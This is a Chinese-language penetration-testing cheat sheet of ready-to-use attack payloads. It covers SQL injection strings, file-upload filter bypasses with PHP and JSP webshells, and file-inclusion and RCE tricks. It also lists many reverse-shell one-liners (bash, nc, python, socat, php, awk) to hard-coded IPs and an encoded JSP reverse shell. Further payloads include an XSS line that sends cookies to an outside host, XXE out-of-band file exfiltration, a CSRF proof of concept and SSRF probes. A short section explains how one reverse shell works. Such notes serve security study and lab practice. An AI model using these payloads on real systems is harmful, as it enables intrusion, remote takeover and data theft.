# 常用命令



## sql注入常用语句

### 联合注入

​	库

```mysql
'union select schema_name from informationschema.schemata-- +
```

​	表

```mysql
'union select table_name from information_schema.tables where table_schema = '[库名]'/database()-- +
```

​	列

```mysql
'union select column_name from information_schema.columns where table_name = '[表名]'-- +
```

​	数据

```mysql
'union select group_concat([列名1],':',[列名2]) from [表名] -- +
```

### 报错注入

```mysql
'and updatexml(1,substr(concat(0x7e,([语句]),0x7e),1,32),1)-- +
```

```mysql
'and extractvalue(1,substr(concat(0x7e,([语句]),0x7e),1,32))-- +
```

​	注:	substr() = substring() = limit()

### 布尔盲注

​	判断结果长度

```mysql
'and length([语句])<200 -- +
```

​	判断结果的第1位是否为 'i'

```mysql
'and substr(([语句]),1,1)='i' -- +
```

​	注:	写脚本时常使用ascii()把字符转为数字再比较

### 延时盲注

​	判断结果长度

```mysql
'and if(length([语句]) = 8,sleep(2),1) -- +
```

​	判断结果的第1位是否为 's'

```mysql
'and if(substr([语句],1,1) = 's',sleep(2),1) -- +
```







## 文件上传PHP解析

默认 PHP 解析后缀：

```
.php, .php5, .php7, .phtml
```

可配置文件解析的后缀（需手动调整服务器）：

```
.html, .htm, .inc, .phar, .php3, .php4, .module, .cgi
```

---

### **默认 PHP 文件后缀**

- **`.php`**（标准 PHP 文件）
- **`.php5`**（旧版 PHP 5 常用）
- **`.php7`**（某些 PHP 7+ 专用）
- **`.phtml`**（PHP + HTML 嵌入式语法）

---

### **可被服务器配置解析为 PHP 的文件后缀**

如果服务器被特殊配置，以下后缀文件可能也被当做 PHP 解析：

- **`.html`**（部分服务器允许内嵌 PHP）
- **`.htm`**（同 `.html`）
- **`.inc`**（旧式 PHP 包含文件）⚠️ **危险！**（易被暴露源码）
- **`.phar`**（PHP 归档文件，可执行代码）
- **`.phps`**（旧式 PHP 源代码显示文件）
- **`.php3`**（PHP 3.x 遗留扩展名）
- **`.php4`**（PHP 4.x 遗留扩展名）
- **`.php6`**（PHP 6 实验版后缀，未正式发布）
- **`.pwml`**（PHP Web Markup Language，少见）
- **`.module`**（部分 CMS 系统如 Drupal 用于 PHP）
- **`.cgi`**（如果配置成运行 PHP-CGI）⚠️ **需检查服务器**
- **`.fcgi`**（FastCGI PHP）⚠️ **需检查服务器**









## 文件上传webshell

### 基础PHP一句话木马

```php
<?php
@eval($_POST[1]);
phpinfo();
?>
<?php@eval($_POST[1]);phpinfo();?>
```

jsp

```jsp
<% if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("\\")+request.getParameter("f"))).write(request.getParameter("t").getBytes()); %>
```

### .htaccess

```
SetHandler application/x-httpd-php
```

### 后缀黑名单绕过

```
大小写绕过
	1.pHp 1.Php 1.PhP
点"."绕过
	1.php.
空格绕过
	1.php[空格]
综合	
	hack.Php. .

::$DATA绕过
	hack.php::$DATA

双写后缀绕过
	hack.pphphp	
```

### 后缀白名单

```
MIME绕过
对照表:	https://mime.wcode.net/zh-hans/
application/x-httpd-php
image/jpeg	.jpg .jpeg .jpe .jfif
image/gif	.gif
image/png	.png

截断前提
	php 版本 <5.3.4 才可以进行00截断
	magic_quotes_gpc = Off
GET  %00截断
	修改 save_path=../upload/shell.php%00 、 filename=a.png
POST  0x00截断
	修改 ../upload/a.php.png filename=a.png
	在php后面添加16进制00
图片马
	copy 1.jpg/b + 2.php/a 3.jpg
```

### 条件竞争

```php
//生成一句话木马
<?php
fputs(fopen('a.php','w'),'<?php eval($_POST[1]); phpinfo(); ?>');
?>
```









## 文件包含函数

### php

```php
include('xxx.php');// 使用该函数包含文件
include_once('xxx.php'); // 功能与include()相同，但是当程序重复调用同一个文件时，只会调用
一次。
require('xxx.php'); // require和include(）类似，但是当require()调用的文件发生错误时，程
序会输出错误信息，并终止脚本的执行。
require_once('xxx.php'); // require()相同，但是当程序重复调用同一个文件时，只会调用一次。
```

### asp

```asp
<!--#include file="xxx.asp"-->
```

### aspx

```asp
<!--#include file="xxx.aspx"-->
```

### jsp

```jsp
<%@ include file="xxx.jsp"%>
<jsp:include page="xxx.jsp"/>
```



## 文件包含-协议流

### php://filter

```
php://filter/read=convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=../../../a.txt
base64解码
```

### php://input

```
allow_url_include：on
http://127.0.0.1/?file=php://input
抓包->改为POST请求->请求内容为要执行的PHP代码
<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST[1]); phpinfo(); ?>'); ?>
```

### file://

```
使用绝对路径
file://D:/a.txt
```

### data://

```
allow_url_fopen ：on
allow_url_include：on
data://text/plaindata://text/plain,<?php%20phpinfo()?>
data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
```

------





## RCE命令执行

写入木马

```
fputs(fopen('a.php','w'),'<?php eval($_POST[1]); phpinfo(); ?>');
echo '<?php @eval($_POST[1]);?>' > a.php
```

过滤分割符

```
; //两条命令都执行,windows不支持
| // 管道
|| //上一条命令执行失败后，才执行下一条命令
& //先执行command2后执行command1
&& //先执行command1后执行command2
```

使用以下字符可以绕过空格

```
tab(%09)
space(%20)
$IFS$9
${IFS}
$IFS
```







## 反弹shell

### 常用语句

```
Windows反弹shell参考https://www.revshells.com/
```

基础: 

```
sh -i >& /dev/tcp/193.168.70.131/4444 0>&1
bash -i >& /dev/tcp/193.168.70.131/4444 0>&1

base64
echo [base64编码的shell] | base64 -d | bash
bash -c {echo,[base64编码的shell]}|{base64,-d}|{bash,-i}

```

远程下载

```
python -m http.server 80
wget http://192.168.70.131/rev.sh
```

Bash read line

```
exec 5<>/dev/tcp/193.168.70.131/9999;cat <&5 | while read line; do $line 2>&5 >&5; done
```

Bash5

```
sh -i 5<> /dev/tcp/192.168.0.106/9999 0<&5 1>&5 2>&5
```

Bash196

```
0<&196;exec 196<>/dev/tcp/192.168.0.106/9999; sh <&196 >&196 2>&19
```

nc

```
nc -c sh 192.168.0.0 4444
```

python2

```
export RHOST="192.168.0.106";export RPORT=9999;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.106",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

python3

```
export RHOST="192.168.0.106";export RPORT=9999;python3 -c 'import 
sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.106",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.0.106",9999));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```

telnet

```
TF=$(mktemp -u);mkfifo $TF && telnet 192.168.0.1 9999 0<$TF | sh 1>$TF
```

zsh

```
zsh -c 'zmodload zsh/net/tcp && ztcp 192.168.0.106 9999 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
```

socat

```
socat TCP:192.168.0.106:9999 EXEC:sh

socat TCP:192.168.0.106:9999 EXEC:'sh',pty,stderr,setsid,sigint,sane
```

php

```
php -r '$sock=fsockopen("192.168.0.106",9999);exec("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("192.168.0.106",9999);shell_exec("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("192.168.0.106",9999);system("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("192.168.0.106",9999);passthru("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("192.168.0.106",9999);`sh <&3 >&3 2>&3`;'
php -r '$sock=fsockopen("192.168.0.106",9999);popen("sh <&3 >&3 2>&3", "r");'
php -r '$sock=fsockopen("192.168.0.106",9999);$proc=proc_open("sh", 
array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```



awk

```
awk 'BEGIN {s = "/inet/tcp/0/192.168.0.106/9999"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```



### 反弹shell文件

jsp反弹shell脚本

```java
<%! Runtime.getRuntime().exec("bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEuMTE3LjkuNTUvODg4OCAwPiYx}|{base64,-d}|{bash,-i}");%>
```





### 文件描述符

**文件描述符的常见范围**

- **0 ~ 1023**：传统 Unix 设定的 **“常用文件描述符”**，很多系统默认限制（`ulimit -n`）为 1024。
- **1024 ~ 65535**：现代 Linux 系统通常允许 **更高数量**（由 `ulimit -n` 或 `/proc/sys/fs/nr_open` 控制）。
- **> 65535**：某些特殊场景可能允许 **百万级** FD（需调整内核参数）。

| FD      | 典型用途          | 说明                     |
| ------- | ----------------- | ------------------------ |
| **0**   | `stdin`           | 文件输入（如 `read`）    |
| **1**   | `stdout`          | 标准输出                 |
| **2**   | `stderr`          | 错误输出                 |
| **3~9** | Shell 脚本临时 FD | `exec 3>file`（手动分配) |

### 自定义FD分析

```
0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196
```

这段代码是一个 **反弹 Shell（Reverse Shell）** 的攻击命令，常用于渗透测试或黑客攻击中。它的作用是被攻击机器主动向攻击者（`attackerip:4444`）发起连接，并提供一个 Shell 会话供攻击者控制。

我们来逐行解析它的工作原理：

---

#### **1. 整体逻辑**

这条命令的核心是：

- **建立 TCP 连接**（`/dev/tcp/attackerip/4444`）
- **重定向 Shell 输入/输出**，使攻击者的指令可以传递给受害者机器，并接收返回结果。

---

#### **2. 关键组成部分解析**

##### **(1) `0<&196`**

- **作用**：关闭 `stdin`（标准输入，FD 0），并用 FD 196 替换它。
- **解释**：
  - 命令执行前，`stdin`（FD 0）通常指向键盘输入。
  - `0<&196` 使 `stdin` 使用 FD 196（后面会定义）。

---

##### **(2) `exec 196<>/dev/tcp/attackerip/4444`**

- **`exec`**：不启动新进程，直接修改当前 Shell 环境。
- **`196<>file`**：
  - `<>` 表示 **读写模式**（同时支持读和写）。
  - `196` 是指定的文件描述符（FD 196）。
- **`/dev/tcp/attackerip/4444`**：
  - **Linux 魔法文件**（Bash 特性，不是真正的设备文件）。
  - 用于创建 **TCP 套接字** 并连接到 `attackerip:4444`（攻击者 IP 和端口）。

**相当于：**

```bash
socket = open("/dev/tcp/attackerip/4444", "rw")  # 伪代码
```

攻击者需要在 `attackerip` 机器上监听 `4444` 端口（如 `nc -lvnp 4444`）。

---

##### **(3) `sh <&196 >&196 2>&196`**

- **`sh`**：启动 `/bin/sh`（Bourne Shell）。
- **重定向**：
  - `sh` 的输入（`stdin`）来自 FD 196 → `<&196`（即攻击者发送的命令）。
  - `sh` 的输出（`stdout`）重定向到 FD 196 → `>&196`（攻击者接收结果）。
  - `sh` 的错误（`stderr`）也重定向到 FD 196 → `2>&196`（攻击者接收报错）。

**最终效果**：

```text
攻击者（192.168.1.100:4444）      				受害者机器
     |          <-- TCP Socket 连接 -->			 |
     |                             				  |
     |--> 发送命令（`ls`）-->  FD 196  --> `sh` 执行 |
     <-- 返回结果（`file.txt`） <-- FD 196 <--	  |
```

攻击者可完全控制受害者的 Shell，如执行任意命令。

------









## XSS常用payload

### 检查过滤(暂定)

```
'"> <``()oN sCrIpt sRc <a hReF &#106;
```

### 基础语句

```javascript
<script>alert('XSS')</script>
<script>new Image().src='http://192.168.70.1:8000/?c='+document.cookie;</script>
```

### img/on..(绕过script)

```javascript
<img src=x onerror=alert('XSS')//
<iframe src="javascript:alert(1)"></iframe>
<body onload="alert('XSS')">
<input value="1" autofocus onfocus=alert(1) x="">
<svg onmousemove="alert(1)">
```

### onfocus可以绕过html实体化<>

```javascript
'onfocus=javascript:alert()'
"onfocus=javascript:alert()"
```

### a href标签法+伪协议

```javascript
"> <a href=javascript:alert()>xxx</a> <"
```

### data伪协议

```javascript
"> <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="> <"
```

### 利用href自动Unicode解码

```
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;
```

### 双写

```javascript
<scrscriptipt>alert('XSS')</scrscriptipt>
<scr<script>ipt>alert('XSS')</scri</script>pt>
```

### 大小写

```javascript
<ScRIpT>alert('XSS')</SCriPt>
```

------





## XXE

### basic

```
<?xml version="1.0" encoding="UTF-8"?>
<site>114514</site>
```

### Windows

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///C://a.txt">]>
<name>&content;</name>
```

### Linux

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///etc/passwd">]>
<name>&content;</name>
```

### 端口探测

响应速度快则有该端口, 慢则没有

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE ANY [<!ENTITY content SYSTEM "http://172.22.0.66:80/">]>
<name>&content;</name>
```

### 外部dtd文件引用

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE ANY [<!ENTITY % file SYSTEM "http://172.22.0.66:8000/my.dtd"> %file;]>
<name>&send;</name>
```

dtd

```xml-dtd
<!ENTITY send SYSTEM "file:///D://a.txt">
```



### 无回显

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=d:/a.txt">
<!ENTITY % dtd SYSTEM "http://193.168.4.3/my2.dtd">
	%dtd;
	%send;
]>
```

dtd

```xml-dtd
<!ENTITY % payload 
    "<!ENTITY &#x25; send SYSTEM 'http://193.168.4.3:8000?data=%file;'>"
>
%payload;
```







## CSRF

pikachu靶场post Poc示例

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://127.0.0.1/pikachu/vul/csrf/csrfpost/csrf_post_edit.php" method="POST">
      <input type="hidden" name="sex" value="man&#33;&#33;&#33;" />
      <input type="hidden" name="phonenum" value="114514" />
      <input type="hidden" name="add" value="uk" />
      <input type="hidden" name="email" value="lili&#64;qq&#46;com" />
      <input id="submit" type="submit" value="Submit request" hidden />
      <script>
      // 加一段js，让它自动执行
      window.onload = function() {
        document.getElementById("submit").click();
      }
      </script>
    </form>
  </body>
</html>
```







## SSRF

```
示例: http://www.xxx.com/a.php?image=http://192.168.0.109/xxx.png
=号后加各种协议

加上端口号，实现了内网服务探测
http://193.168.4.69:22
dict://127.0.0.1:3306

读取源码,可以使用相对路径
php://filter/read=convert.base64-encode/resource=ssrf.php

以绝对路径读取文件
file://D:/a.txt
file:///etc/passwd
```





## PHP反序列化

### 魔术变量

```
https://www.php.net/manual/zh/language.oop5.magic.php

__construct() 当一个对象创建的时候被调用

__destruct() 当一个对象销毁的时候被调用

__toString() 当一个对象被当作字符串使用的时候被调用

__invoke 当尝试以调用函数的方式调用一个对象时，会被调用

__sleep() 当对象在被序列化之前运行

__wakeup() 当在被反序列化之后调用

__get() 访问私有变量或不存在的变量均会触发

__set() 给私有变量或不存在的变量赋值时，会触发

__unset 对私有变量或不存在的变量调用unset时，会触发

__call 在对象中调用一个不可访问方法时，会被调用
```



### phar协议

```
包含phar文件时,会自动进行反序列化
用法：?file=phar://压缩包/内部文件
phar://./shell.jpg/shell.php
```



### zip协议

```
需要指定绝对路径，同时将#编码为%23，之后填上压缩包内的文件
zip://D:\phpStudy\WWW\fileinclude\test.zip%23phpinfo.txt

压缩包内存在子文件夹
zip://D:\phpStudy\WWW\fileinclude\test.zip%23test\phpinfo.txt
```





